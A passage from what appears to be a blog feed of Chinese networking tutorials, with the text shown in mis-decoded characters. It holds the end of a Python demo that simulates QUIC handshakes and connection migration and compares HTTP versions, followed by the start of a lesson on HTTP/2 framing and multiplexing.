Response&quot;        )        self.received_packets.append(response_pkt)        elapsed = (time.time() - start_time) * 1000        print(f&quot;\nâœ… è¿æ¥è¿ç§»å®Œæˆï¼&quot;)        print(f&quot;æ€»è€—æ—¶: {elapsed:.2f}ms&quot;)        print(f&quot;æ— éœ€é‡æ–°æ¡æ‰‹ï¼Œç»§ç»­ä½¿ç”¨åŸè¿æ¥ï¼&quot;)        return elapsed    def send_data(self, data: str, stream_id: int):        &quot;&quot;&quot;        å‘é€åº”ç”¨æ•°æ®        å‚æ•°ï¼š            data: è¦å‘é€çš„æ•°æ®            stream_id: æµID        &quot;&quot;&quot;        pkt = QUICPacket(            PacketType.ONERTT,            self.connection_id,            self.packet_number,            f&quot;Stream {stream_id}: {data}&quot;        )        self.sent_packets.append(pkt)        self.packet_number += 1        print(f&quot;å‘é€æ•°æ®: {pkt.payload}&quot;)class ProtocolComparison:    &quot;&quot;&quot;    åè®®æ€§èƒ½å¯¹æ¯”    &quot;&quot;&quot;    @staticmethod    def compare_handshake():        &quot;&quot;&quot;        å¯¹æ¯”æ¡æ‰‹æ€§èƒ½        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; åè®®æ¡æ‰‹æ€§èƒ½å¯¹æ¯”&quot;)        print(&quot;=&quot;*60)        rtt = 50  # å‡è®¾RTTä¸º50ms        print(f&quot;\nå‡è®¾æ¡ä»¶ï¼šRTT = {rtt}ms\n&quot;)        # HTTP/1.1        print(&quot;HTTP/1.1 over TCP + TLS:&quot;)        print(&quot;  TCPæ¡æ‰‹:     1-RTT ({rtt}ms)&quot;)        print(&quot;  TLSæ¡æ‰‹:     2-RTT ({rtt*2}ms)&quot;)        print(&quot;  HTTPè¯·æ±‚:    1-RTT ({rtt}ms)&quot;)        http1_total = rtt * 4        print(f&quot;  æ€»è®¡:        4-RTT ({http1_total}ms)&quot;)        # HTTP/2        print(f&quot;\nHTTP/2 over TCP + TLS 1.3:&quot;)        print(f&quot;  TCPæ¡æ‰‹:     1-RTT ({rtt}ms)&quot;)        print(f&quot;  TLS 1.3æ¡æ‰‹: 1-RTT ({rtt}ms)&quot;)        print(f&quot;  HTTPè¯·æ±‚:    1-RTT ({rtt}ms)&quot;)        http2_total = rtt * 3        print(f&quot;  æ€»è®¡:        3-RTT ({http2_total}ms)&quot;)        # HTTP/3 (1-RTT)        print(f&quot;\nHTTP/3 over QUIC (1-RTT):&quot;)        print(f&quot;  QUICæ¡æ‰‹+è¯·æ±‚: 1-RTT ({rtt}ms)&quot;)        http3_1rtt = rtt        print(f&quot;  æ€»è®¡:        1-RTT ({http3_1rtt}ms)&quot;)        # HTTP/3 (0-RTT)        print(f&quot;\nHTTP/3 over QUIC (0-RTT):&quot;)        print(f&quot;  ç›´æ¥å‘é€æ•°æ®: 0-RTT (0ms)&quot;)        http3_0rtt = 0        print(f&quot;  æ€»è®¡:        0-RTT ({http3_0rtt}ms)&quot;)        # æ€»ç»“        print(f&quot;\næ€§èƒ½æå‡ï¼š&quot;)        print(f&quot;  HTTP/3(1-RTT) vs HTTP/1.1: {(1 - http3_1rtt/http1_total)*100:.1f}%&quot;)        print(f&quot;  HTTP/3(1-RTT) vs HTTP/2:   {(1 - http3_1rtt/http2_total)*100:.1f}%&quot;)        print(f&quot;  HTTP/3(0-RTT) vs HTTP/2:   {(1 - http3_0rtt/http2_total)*100:.1f}%&quot;)    @staticmethod    def compare_packet_loss():        &quot;&quot;&quot;        å¯¹æ¯”ä¸¢åŒ…å½±å“        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; ä¸¢åŒ…å½±å“å¯¹æ¯”&quot;)        print(&quot;=&quot;*60)        print(&quot;&quot;&quot;åœºæ™¯ï¼šåŒæ—¶ä¼ è¾“3ä¸ªæµï¼Œæ¯ä¸ªæµ10ä¸ªåŒ…ï¼Œç¬¬2ä¸ªæµä¸¢å¤±1ä¸ªåŒ…HTTP/2 over TCP:â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ æµ1: [1][2][3][4][5][6][7][8][9][10] â¸ï¸ ç­‰å¾…      â”‚â”‚ æµ2: [1][X][ç­‰å¾…é‡ä¼ ...] â¸ï¸ é˜»å¡                  â”‚â”‚ æµ3: [1][2][3][4][5][6][7][8][9][10] â¸ï¸ ç­‰å¾…      â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜é—®é¢˜ï¼šTCPè¦æ±‚æŒ‰åºäº¤ä»˜ï¼Œæµ2çš„ä¸¢åŒ…é˜»å¡æ‰€æœ‰æµå½±å“ï¼šæ‰€æœ‰30ä¸ªåŒ…éƒ½è¦ç­‰å¾…æµ2é‡ä¼ å®ŒæˆHTTP/3 over QUIC:â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ æµ1: [1][2][3][4][5][6][7][8][9][10] âœ… å®Œæˆ       â”‚â”‚ æµ2: [1][X][ç­‰å¾…é‡ä¼ ...] â¸ï¸ åªå½±å“æµ2            â”‚â”‚ æµ3: [1][2][3][4][5][6][7][8][9][10] âœ… å®Œæˆ       â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ä¼˜åŠ¿ï¼šæ¯ä¸ªæµç‹¬ç«‹ï¼Œæµ2çš„ä¸¢åŒ…åªå½±å“æµ2è‡ªå·±å½±å“ï¼šåªæœ‰1ä¸ªåŒ…éœ€è¦é‡ä¼ ï¼Œå…¶ä»–29ä¸ªåŒ…æ­£å¸¸ä¼ è¾“æ€§èƒ½å·®å¼‚ï¼ˆä¸¢åŒ…ç‡5%ï¼‰ï¼š- HTTP/2: æ‰€æœ‰ä¼ è¾“è¢«é˜»å¡ï¼Œå»¶è¿Ÿå¢åŠ 200%+- HTTP/3: åªæœ‰å—å½±å“çš„æµéœ€è¦é‡ä¼ ï¼Œå»¶è¿Ÿå¢åŠ 10%ç»“è®ºï¼šåœ¨å¼±ç½‘ç¯å¢ƒä¸‹ï¼ŒHTTP/3æ€§èƒ½ä¼˜åŠ¿æ›´æ˜æ˜¾        &quot;&quot;&quot;)def main():    &quot;&quot;&quot;ä¸»ç¨‹åº&quot;&quot;&quot;    print(&quot;&quot;&quot;    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—    â•‘       HTTP/3 &amp; QUIC åè®®æ¼”ç¤º v1.0                         â•‘    â•‘       HTTP/3 &amp; QUIC Protocol Demo                        â•‘    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•    &quot;&quot;&quot;)    # ç”ŸæˆConnection ID    conn_id = f&quot;conn_{random.randint(10000, 99999)}&quot;    # åˆ›å»ºQUICè¿æ¥    conn = QUICConnection(conn_id)    # 1. æ¼”ç¤º1-RTTæ¡æ‰‹    print(&quot;\nã€æ¼”ç¤º1ï¼šé¦–æ¬¡è¿æ¥ - 1-RTTæ¡æ‰‹ã€‘&quot;)    rtt_1 = conn.handshake_1rtt()    input(&quot;\næŒ‰Enterç»§ç»­...&quot;)    # 2. æ¼”ç¤º0-RTTæ¡æ‰‹    print(&quot;\nã€æ¼”ç¤º2ï¼šå†æ¬¡è¿æ¥ - 0-RTTæ¡æ‰‹ã€‘&quot;)    rtt_0 = conn.handshake_0rtt()    input(&quot;\næŒ‰Enterç»§ç»­...&quot;)    # 3. æ¼”ç¤ºè¿æ¥è¿ç§»    print(&quot;\nã€æ¼”ç¤º3ï¼šç½‘ç»œåˆ‡æ¢ - è¿æ¥è¿ç§»ã€‘&quot;)    conn.migrate_connection(&quot;10.0.0.50&quot;)    input(&quot;\næŒ‰Enterç»§ç»­...&quot;)    # 4. æ€§èƒ½å¯¹æ¯”    print(&quot;\nã€æ¼”ç¤º4ï¼šåè®®æ€§èƒ½å¯¹æ¯”ã€‘&quot;)    ProtocolComparison.compare_handshake()    input(&quot;\næŒ‰Enterç»§ç»­...&quot;)    ProtocolComparison.compare_packet_loss()    # æ€»ç»“    print(&quot;\n&quot; + &quot;=&quot;*60)    print(&quot; æ€»ç»“&quot;)    print(&quot;=&quot;*60)    print(&quot;&quot;&quot;HTTP/3 å’Œ QUIC çš„æ ¸å¿ƒä¼˜åŠ¿ï¼š1. æ›´å¿«çš„è¿æ¥å»ºç«‹   âœ… 1-RTTæˆ–0-RTTï¼Œæ¯”HTTP/2å¿«2-3å€2. æ¶ˆé™¤é˜Ÿå¤´é˜»å¡   âœ… æ¯ä¸ªæµç‹¬ç«‹ï¼Œä¸¢åŒ…åªå½±å“å•ä¸ªæµ3. è¿æ¥è¿ç§»   âœ… ç½‘ç»œåˆ‡æ¢æ— éœ€é‡æ–°è¿æ¥4. æ”¹è¿›çš„æ‹¥å¡æ§åˆ¶   âœ… åŸºäºQUICï¼Œæ›´çµæ´»çš„æ‹¥å¡æ§åˆ¶ç®—æ³•5. å†…ç½®åŠ å¯†   âœ… é»˜è®¤TLS 1.3åŠ å¯†ï¼Œæ›´å®‰å…¨6. æ›´å¿«çš„å‘å±•   âœ… åŸºäºUDPï¼Œåœ¨ç”¨æˆ·ç©ºé—´å®ç°ï¼Œæ›´æ–°æ›´å¿«é€‚ç”¨åœºæ™¯ï¼š- ç§»åŠ¨ç½‘ç»œï¼ˆé¢‘ç¹åˆ‡æ¢ï¼‰- å¼±ç½‘ç¯å¢ƒï¼ˆé«˜ä¸¢åŒ…ç‡ï¼‰- å®æ—¶åº”ç”¨ï¼ˆä½å»¶è¿Ÿè¦æ±‚ï¼‰- è§†é¢‘æµåª’ä½“- Webåº”ç”¨ä¸‹ä¸€èŠ‚æˆ‘ä»¬å°†å­¦ä¹ RESTful APIè®¾è®¡ï¼    &quot;&quot;&quot;)if __name__ == &quot;__main__&quot;:    main()</code></pre>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>28å¤©ï¼šHTTP/2åè®®ç‰¹æ€§</title>
    <link href="/2025/11/10/28%E5%A4%A9%EF%BC%9AHTTP_2%E5%8D%8F%E8%AE%AE%E7%89%B9%E6%80%A7/"/>
    <url>/2025/11/10/28%E5%A4%A9%EF%BC%9AHTTP_2%E5%8D%8F%E8%AE%AE%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬28å¤©ï¼šHTTP-2åè®®ç‰¹æ€§"><a href="#ç¬¬28å¤©ï¼šHTTP-2åè®®ç‰¹æ€§" class="headerlink" title="ç¬¬28å¤©ï¼šHTTP&#x2F;2åè®®ç‰¹æ€§"></a>ç¬¬28å¤©ï¼šHTTP&#x2F;2åè®®ç‰¹æ€§</h1><blockquote><p>â€œHTTP&#x2F;2å°±åƒä»å•è½¦é“å‡çº§åˆ°å¤šè½¦é“é«˜é€Ÿå…¬è·¯ï¼Œè®©ç½‘é¡µåŠ è½½å¿«å¦‚é—ªç”µï¼â€</p></blockquote><h2 id="ğŸ“š-ä»Šæ—¥ç›®æ ‡"><a href="#ğŸ“š-ä»Šæ—¥ç›®æ ‡" class="headerlink" title="ğŸ“š ä»Šæ—¥ç›®æ ‡"></a>ğŸ“š ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£HTTP&#x2F;1.1çš„æ€§èƒ½ç“¶é¢ˆ</li><li>æŒæ¡HTTP&#x2F;2çš„æ ¸å¿ƒç‰¹æ€§</li><li>å­¦ä¹ äºŒè¿›åˆ¶åˆ†å¸§æœºåˆ¶</li><li>ç†è§£å¤šè·¯å¤ç”¨åŸç†</li><li>å®ç°HTTP&#x2F;2å®¢æˆ·ç«¯</li></ul><hr><h2 id="1-HTTP-1-1çš„é—®é¢˜"><a href="#1-HTTP-1-1çš„é—®é¢˜" class="headerlink" title="1. HTTP&#x2F;1.1çš„é—®é¢˜"></a>1. HTTP&#x2F;1.1çš„é—®é¢˜</h2><h3 id="1-1-æ€§èƒ½ç“¶é¢ˆ"><a href="#1-1-æ€§èƒ½ç“¶é¢ˆ" class="headerlink" title="1.1 æ€§èƒ½ç“¶é¢ˆ"></a>1.1 æ€§èƒ½ç“¶é¢ˆ</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs markdown">HTTP/1.1å­˜åœ¨çš„ä¸»è¦é—®é¢˜ï¼š<br><br><span class="hljs-bullet">1.</span> é˜Ÿå¤´é˜»å¡ (Head-of-Line Blocking)<br>   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>   â”‚  è¯·æ±‚1  â†’  ç­‰å¾…å“åº”1                  â”‚<br>   â”‚  è¯·æ±‚2  â†’  ç­‰å¾…è¯·æ±‚1å®Œæˆæ‰èƒ½å‘é€      â”‚<br>   â”‚  è¯·æ±‚3  â†’  ç­‰å¾…è¯·æ±‚2å®Œæˆæ‰èƒ½å‘é€      â”‚<br>   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>   é—®é¢˜ï¼šä¸€ä¸ªæ…¢è¯·æ±‚ä¼šé˜»å¡åé¢æ‰€æœ‰è¯·æ±‚<br><br><span class="hljs-bullet">2.</span> è¿æ¥æ•°é™åˆ¶<br><span class="hljs-bullet">   -</span> æµè§ˆå™¨å¯¹æ¯ä¸ªåŸŸåé™åˆ¶6-8ä¸ªå¹¶å‘è¿æ¥<br><span class="hljs-bullet">   -</span> éœ€è¦åŸŸååˆ†ç‰‡(Domain Sharding)æ¥ç»•è¿‡é™åˆ¶<br><span class="hljs-bullet">   -</span> å¢åŠ DNSæŸ¥è¯¢å’ŒTCPè¿æ¥å¼€é”€<br><br><span class="hljs-bullet">3.</span> å¤´éƒ¨å†—ä½™<br><span class="hljs-bullet">   -</span> æ¯ä¸ªè¯·æ±‚éƒ½è¦å‘é€å®Œæ•´çš„HTTPå¤´<br><span class="hljs-bullet">   -</span> Cookieç­‰ä¿¡æ¯é‡å¤å‘é€<br><span class="hljs-bullet">   -</span> æµªè´¹å¸¦å®½<br><br><span class="hljs-bullet">4.</span> æ— æ³•è®¾ç½®ä¼˜å…ˆçº§<br><span class="hljs-bullet">   -</span> æ‰€æœ‰èµ„æºå¹³ç­‰å¯¹å¾…<br><span class="hljs-bullet">   -</span> å…³é”®èµ„æºå¯èƒ½è¢«å»¶è¿ŸåŠ è½½<br></code></pre></td></tr></table></figure><h3 id="1-2-ç”Ÿæ´»åŒ–ç±»æ¯”"><a href="#1-2-ç”Ÿæ´»åŒ–ç±»æ¯”" class="headerlink" title="1.2 ç”Ÿæ´»åŒ–ç±»æ¯”"></a>1.2 ç”Ÿæ´»åŒ–ç±»æ¯”</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs abnf">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-operator">=</span> å•è½¦é“æ”¶è´¹ç«™<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  è½¦<span class="hljs-number">1</span> â†’ æ­£åœ¨æ”¶è´¹                              â”‚<br>â”‚  è½¦<span class="hljs-number">2</span> â†’ ç­‰å¾…è½¦<span class="hljs-number">1</span>                               â”‚<br>â”‚  è½¦<span class="hljs-number">3</span> â†’ ç­‰å¾…è½¦<span class="hljs-number">2</span>                               â”‚<br>â”‚  è½¦<span class="hljs-number">4</span> â†’ ç­‰å¾…è½¦<span class="hljs-number">3</span>                               â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>é—®é¢˜ï¼šä¸€è¾†è½¦æ…¢äº†ï¼Œåé¢å…¨éƒ½æ…¢<br><br>HTTP/<span class="hljs-number">2</span> <span class="hljs-operator">=</span> å¤šè½¦é“æ”¶è´¹ç«™ï¼ˆETCï¼‰<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  è½¦<span class="hljs-number">1</span>ã€è½¦<span class="hljs-number">2</span>ã€è½¦<span class="hljs-number">3</span>ã€è½¦<span class="hljs-number">4</span>  â†’ åŒæ—¶é€šè¿‡              â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>ä¼˜åŠ¿ï¼šæ‰€æœ‰è½¦åŒæ—¶å¿«é€Ÿé€šè¿‡<br></code></pre></td></tr></table></figure><hr><h2 id="2-HTTP-2æ ¸å¿ƒç‰¹æ€§"><a href="#2-HTTP-2æ ¸å¿ƒç‰¹æ€§" class="headerlink" title="2. HTTP&#x2F;2æ ¸å¿ƒç‰¹æ€§"></a>2. HTTP&#x2F;2æ ¸å¿ƒç‰¹æ€§</h2><h3 id="2-1-ç‰¹æ€§æ¦‚è§ˆ"><a href="#2-1-ç‰¹æ€§æ¦‚è§ˆ" class="headerlink" title="2.1 ç‰¹æ€§æ¦‚è§ˆ"></a>2.1 ç‰¹æ€§æ¦‚è§ˆ</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs markdown">HTTP/2çš„äº”å¤§æ ¸å¿ƒç‰¹æ€§ï¼š<br><br><span class="hljs-bullet">1.</span> äºŒè¿›åˆ¶åˆ†å¸§ (Binary Framing)<br><span class="hljs-bullet">   -</span> HTTP/1.1: æ–‡æœ¬åè®®<br><span class="hljs-bullet">   -</span> HTTP/2: äºŒè¿›åˆ¶åè®®<br><span class="hljs-bullet">   -</span> æ›´é«˜æ•ˆçš„è§£æå’Œä¼ è¾“<br><br><span class="hljs-bullet">2.</span> å¤šè·¯å¤ç”¨ (Multiplexing)<br><span class="hljs-bullet">   -</span> å•ä¸ªTCPè¿æ¥<br><span class="hljs-bullet">   -</span> å¤šä¸ªè¯·æ±‚/å“åº”å¹¶è¡Œ<br><span class="hljs-bullet">   -</span> æ— é˜Ÿå¤´é˜»å¡<br><br><span class="hljs-bullet">3.</span> å¤´éƒ¨å‹ç¼© (Header Compression)<br><span class="hljs-bullet">   -</span> HPACKå‹ç¼©ç®—æ³•<br><span class="hljs-bullet">   -</span> å‡å°‘å¤´éƒ¨å¤§å°<br><span class="hljs-bullet">   -</span> ç»´æŠ¤å¤´éƒ¨å­—å…¸<br><br><span class="hljs-bullet">4.</span> æœåŠ¡å™¨æ¨é€ (Server Push)<br><span class="hljs-bullet">   -</span> ä¸»åŠ¨æ¨é€èµ„æº<br><span class="hljs-bullet">   -</span> æ— éœ€å®¢æˆ·ç«¯è¯·æ±‚<br><span class="hljs-bullet">   -</span> æå‰åŠ è½½å…³é”®èµ„æº<br><br><span class="hljs-bullet">5.</span> è¯·æ±‚ä¼˜å…ˆçº§ (Stream Priority)<br><span class="hljs-bullet">   -</span> è®¾ç½®èµ„æºä¼˜å…ˆçº§<br><span class="hljs-bullet">   -</span> å…³é”®èµ„æºä¼˜å…ˆåŠ è½½<br><span class="hljs-bullet">   -</span> ä¼˜åŒ–é¡µé¢æ¸²æŸ“<br></code></pre></td></tr></table></figure><h3 id="2-2-äºŒè¿›åˆ¶åˆ†å¸§å±‚"><a href="#2-2-äºŒè¿›åˆ¶åˆ†å¸§å±‚" class="headerlink" title="2.2 äºŒè¿›åˆ¶åˆ†å¸§å±‚"></a>2.2 äºŒè¿›åˆ¶åˆ†å¸§å±‚</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs nix">HTTP<span class="hljs-operator">/</span><span class="hljs-number">2</span>çš„åˆ†å±‚ç»“æ„ï¼š<br><br>åº”ç”¨å±‚<br>  â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  HTTP<span class="hljs-symbol">/2</span> è¯­ä¹‰å±‚                       â”‚<br>â”‚  (è¯·æ±‚ã€å“åº”ã€å¤´éƒ¨ã€æ•°æ®)             â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>  â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  HTTP<span class="hljs-symbol">/2</span> åˆ†å¸§å±‚ (Binary Framing)     â”‚<br>â”‚  <span class="hljs-operator">-</span> å°†æ¶ˆæ¯åˆ†å‰²æˆå¸§                    â”‚<br>â”‚  <span class="hljs-operator">-</span> å¸§ç±»å‹ï¼šHEADERS, DATA, etc.      â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>  â†“<br>TCP<span class="hljs-operator">/</span>IPåè®®æ ˆ<br><br>å¸§çš„ç»“æ„ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ Length   â”‚ Type     â”‚ Flags    â”‚ Stream IDâ”‚<br>â”‚ (<span class="hljs-number">3</span>å­—èŠ‚)  â”‚ (<span class="hljs-number">1</span>å­—èŠ‚)  â”‚ (<span class="hljs-number">1</span>å­—èŠ‚)  â”‚ (<span class="hljs-number">4</span>å­—èŠ‚)   â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚             Frame Payload                 â”‚<br>â”‚             (å¸§è´Ÿè½½)                       â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>å¸§ç±»å‹ï¼š<br><span class="hljs-operator">-</span> <span class="hljs-params">DATA:</span> ä¼ è¾“æ•°æ®<br><span class="hljs-operator">-</span> <span class="hljs-params">HEADERS:</span> ä¼ è¾“å¤´éƒ¨<br><span class="hljs-operator">-</span> <span class="hljs-params">PRIORITY:</span> è®¾ç½®ä¼˜å…ˆçº§<br><span class="hljs-operator">-</span> <span class="hljs-params">RST_STREAM:</span> ç»ˆæ­¢æµ<br><span class="hljs-operator">-</span> <span class="hljs-params">SETTINGS:</span> è®¾ç½®å‚æ•°<br><span class="hljs-operator">-</span> <span class="hljs-params">PUSH_PROMISE:</span> æœåŠ¡å™¨æ¨é€<br><span class="hljs-operator">-</span> <span class="hljs-params">PING:</span> å¿ƒè·³æ£€æµ‹<br><span class="hljs-operator">-</span> <span class="hljs-params">GOAWAY:</span> å…³é—­è¿æ¥<br><span class="hljs-operator">-</span> <span class="hljs-params">WINDOW_UPDATE:</span> æµé‡æ§åˆ¶<br><span class="hljs-operator">-</span> <span class="hljs-params">CONTINUATION:</span> å»¶ç»­å¤´éƒ¨<br></code></pre></td></tr></table></figure><h3 id="2-3-å¤šè·¯å¤ç”¨åŸç†"><a href="#2-3-å¤šè·¯å¤ç”¨åŸç†" class="headerlink" title="2.3 å¤šè·¯å¤ç”¨åŸç†"></a>2.3 å¤šè·¯å¤ç”¨åŸç†</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs stylus">HTTP/<span class="hljs-number">1.1</span> vs HTTP/<span class="hljs-number">2</span> è¿æ¥æ¨¡å‹ï¼š<br><br>HTTP/<span 